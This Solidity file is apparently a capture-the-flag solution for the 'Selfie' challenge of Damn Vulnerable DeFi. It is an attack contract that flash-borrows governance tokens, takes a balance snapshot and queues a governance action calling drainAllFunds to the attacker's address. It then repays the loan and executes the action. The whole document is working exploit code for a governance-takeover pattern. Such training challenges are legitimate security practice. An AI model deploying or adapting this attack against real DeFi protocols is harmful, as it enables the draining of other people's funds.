// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface ISimpleGovernance {   
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
    function getActionDelay() external returns (uint256);
}

interface ISelfiePool{
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface IDamnValuableTokenSnapshot is IERC20 {   
    function snapshot() external returns (uint256);
}

contract SelfieAbuser {
    ISimpleGovernance governance;
    ISelfiePool flashLoanerPool;
    address attackSender;
    uint256 actionId;

    function receiveTokens(address token, uint256 amount) external {
        IDamnValuableTokenSnapshot(token).snapshot();

        actionId = governance.queueAction(address(flashLoanerPool), abi.encodeWithSignature("drainAllFunds(address)", attackSender), 0);

        IDamnValuableTokenSnapshot(token).transfer(address(flashLoanerPool), amount);
    }

    function prepareAttack(address _flashLoaner, address _governance, uint256 _amount) external {
        governance = ISimpleGovernance(_governance);
        flashLoanerPool = ISelfiePool(_flashLoaner);
        attackSender = msg.sender;

        flashLoanerPool.flashLoan(_amount);
    }

    function executeAttack() external {
        governance.executeAction(actionId);
    }
}
